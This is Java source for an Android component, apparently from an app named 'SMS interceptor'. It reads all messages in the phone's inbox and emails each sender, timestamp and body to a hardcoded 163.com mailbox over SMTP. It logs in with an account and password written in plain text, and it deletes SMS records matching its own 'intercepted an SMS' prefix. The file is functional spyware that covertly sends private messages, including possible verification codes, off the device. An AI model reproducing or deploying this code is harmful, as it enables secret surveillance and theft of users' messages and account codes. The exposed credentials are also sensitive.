package com.sms.interceptor;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.Email;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.SimpleEmail;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by zhangfei on 15/9/20.
 */
public class EmailUtils {
    private static final String SENDER = "zhangfei_jiayou@163.com";
    private static final String ACCOUNT = "zhangfei_jiayou";
    private static final String PASSWORD = "9880519";

    private static final String RECEIVER = "zhangfei_jiayou@163.com";

    private static final SimpleDateFormat FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    private static final String SMS_PREFIX = "监听到一条短信\n";

    public static final String[] COLUMNS = new String[]{
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE
    };

    public static void sendEmail(Context context, String sender, long receivedDt, String smsBody) {
        boolean networkAvailable = NetworkUtils.isNetworkConnected(context);
        if (!networkAvailable) {
            return;
        }

        StringBuilder builder = new StringBuilder();
        builder.append(SMS_PREFIX);
        builder.append("接收时间：" + FORMAT.format(new Date(receivedDt)) + "\n");
        builder.append("发件人：" + sender + "\n");
        builder.append("内容：" + smsBody);


        try {
            Email email = new SimpleEmail();
            email.setHostName("smtp.163.com");
            email.setSmtpPort(465);
            email.setAuthenticator(new DefaultAuthenticator(ACCOUNT, PASSWORD));
            email.setFrom(SENDER);
            email.setSubject(builder.toString());
            email.setMsg("This is a test mail ... :-)");
            email.addTo(RECEIVER);
            email.send();

            deleteSms(context, Telephony.Sms.Outbox.BODY + " LIKE ?", new String[]{"%" + SMS_PREFIX + "%"});
        } catch (EmailException e) {
            e.printStackTrace();
        }
    }

    private static void deleteSms(Context context, String where, String[] whereArgs) {
        context.getContentResolver().delete(Uri.parse("content://sms"), where, whereArgs);
    }

    public static void checkSmsInLoop(Context context) {
        Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                COLUMNS, null, null,
                Telephony.Sms._ID + " DESC");

        if (cursor == null) {
            return;
        }

        while (cursor.moveToNext()) {
            String address = cursor.getString(0);
            String body = cursor.getString(1);
            long receivedDt = cursor.getLong(2);

            EmailUtils.sendEmail(context, address, receivedDt, body);
        }
        cursor.close();
    }
}
